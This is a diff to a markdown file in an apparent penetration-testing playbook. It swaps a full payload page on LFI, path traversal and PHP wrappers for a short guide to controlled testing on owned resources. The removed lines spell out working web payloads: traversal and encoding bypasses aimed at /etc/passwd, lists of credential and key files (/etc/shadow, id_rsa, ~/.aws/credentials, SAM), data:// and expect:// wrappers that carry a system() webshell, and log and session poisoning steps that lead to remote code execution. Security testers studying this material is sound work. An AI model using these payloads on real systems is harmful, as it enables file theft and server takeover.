@@ -1,133 +1,26 @@
-# PAYLOADS — LFI / Path Traversal & PHP Wrappers
+# Context payload lookup: lfi rfi path traversal
 
-> Moved from payloads/SKILL.md during the 2026-09-19 playbook split. Load on demand only.
+Canonical guide: [lfi_rfi_path_traversal.md](../../web-mode/SKILL_FILES/VULNERABILITIES/WEB/lfi_rfi_path_traversal.md).
 
-## 7. LFI / Path Traversal & PHP Wrappers
+This entry point contains selection rules, not a second payload library. Load the
+canonical guide's experiment and payload sections; its controls, preconditions,
+source/version limits and interpretation travel with every example.
 
-### CLASSIC TRAVERSAL
-```
-../../../../../etc/passwd
-....//....//....//etc/passwd
-%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
-%252e%252e%252fetc/passwd
-..%c0%af..%c0%afetc/passwd
-..%5c..%5c..%5cetc/passwd
-/var/www/../../etc/passwd
-file:///etc/passwd
-```
+## Select the experiment
 
-### NULL BYTE (PHP <5.3) / EXTENSION SUFFIX BYPASS
-```
-../../../etc/passwd%00
-../../../etc/passwd%00.png
+- Contexts: Download path / archive path / include / stream wrapper.
+- Use two researcher-created distinguishable files. File reading, template inclusion and code execution are separate capabilities. Null bytes and historical wrappers require matching versions and configuration.
+- Name the input source, decoder/parser and expected security boundary first.
+- Discovery may use a cheap justified probe before any primitive is confirmed.
+- Choose a valid baseline, a minimally changed probe, and a matched negative control.
+- Substitute only owned actor/resource IDs and a unique `AUDIT_MARKER`.
+- Preserve the real parser bytes and any required URL/base64/JSON encoding.
+- Record a denied request as the tested observation; do not certify the whole class.
+- An observed source example is not a vendor-wide working payload or target proof.
 
-../../../etc/passwd?.png       # if not strict
-../../../etc/passwd#.png
-../../../etc/passwd//.png
-../../../etc/passwd../passwd
-```
+## Return to the owning methodology
 
-### INTERESTING FILES — LINUX
-```
-/etc/passwd
-/etc/shadow
-/etc/hosts
-/etc/issue
-/etc/group
-/etc/sudoers
-/etc/crontab
-/etc/cron.d/
-/etc/ssh/sshd_config
-/etc/apache2/apache2.conf
-/etc/nginx/nginx.conf
-/etc/mysql/my.cnf
-/proc/self/environ
-/proc/self/cmdline
-/proc/self/status
-/proc/self/maps
-/proc/version
-/proc/net/tcp
-/proc/net/arp
-/root/.ssh/id_rsa
-/root/.ssh/authorized_keys
-/root/.bash_history
-/var/log/auth.log
-/var/log/apache2/access.log
-/var/log/nginx/access.log
-/var/log/syslog
-/var/mail/root
-/var/spool/cron/crontabs/root
-/var/www/html/.env
-/var/www/html/wp-config.php
-/var/www/html/configuration.php
-~/.aws/credentials
-~/.docker/config.json
-~/.kube/config
-~/.netrc
-~/.npmrc
-```
-
-### INTERESTING FILES — WINDOWS
-```
-C:\\Windows\\win.ini
-C:\\Windows\\System32\\drivers\\etc\\hosts
-C:\\boot.ini
-C:\\inetpub\\wwwroot\\web.config
-C:\\Windows\\repair\\sam
-C:\\Windows\\repair\\system
-C:\\Windows\\repair\\security
-C:\\Windows\\System32\\config\\SAM
-C:\\Users\\Administrator\\.ssh\\id_rsa
-%SYSTEMROOT%\\System32\\drivers\\etc\\hosts
-```
-
-### PHP WRAPPERS
-```
-php://filter/convert.base64-encode/resource=index.php
-php://filter/read=convert.base64-encode/resource=index.php
-php://filter/convert.iconv.UTF-8.UTF-16LE|convert.iconv.UTF-16LE.UTF-8/resource=index.php
-php://filter/zlib.deflate/convert.base64-encode/resource=index.php
-php://input                          # POST body executed if include
-php://stdin
-data://text/plain,<?php system($_GET[c]);?>
-data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==
-expect://id                          # if expect ext loaded
-phar://upload.zip/x.txt              # PHP object injection chain
-zip://upload.zip%23x.txt
-file:///etc/passwd
-```
-
-### LOG POISONING (LFI → RCE)
-```
-# Inject PHP into Apache access log via User-Agent
-GET / HTTP/1.1
-User-Agent: <?php system($_GET['c']); ?>
-
-# Then include the log:
-?file=../../../var/log/apache2/access.log&c=id
-```
-
-### SESSION POISONING / /PROC SELF
-```
-# Inject via username/email/note that gets stored in PHP session file
-<?php system($_GET['c']); ?>
-
-# Then include:
-?file=../../../var/lib/php/sessions/sess_<SID>&c=id
-
-?file=/proc/self/environ                        # poison via User-Agent
-?file=/proc/self/cmdline
-?file=/proc/self/fd/0
-```
-
-### ENCODED VARIANTS
-```
-%2e%2e%2f                              # ../
-%2e%2e%5c                              # ..\
-%c0%ae%c0%ae%c0%af                     # ../  (UTF-8 overlong)
-..%252f                                 # double URL-encoded
-..%c0%af
-..%252fetc%252fpasswd
-```
-
----
+If no example fits the observed sink, reason from that sink or current primary
+research rather than loading unrelated variants. If the application rejects the
+probe, discriminate parsing, reachability, authorization and delivery failure
+before either expanding or closing the hypothesis.
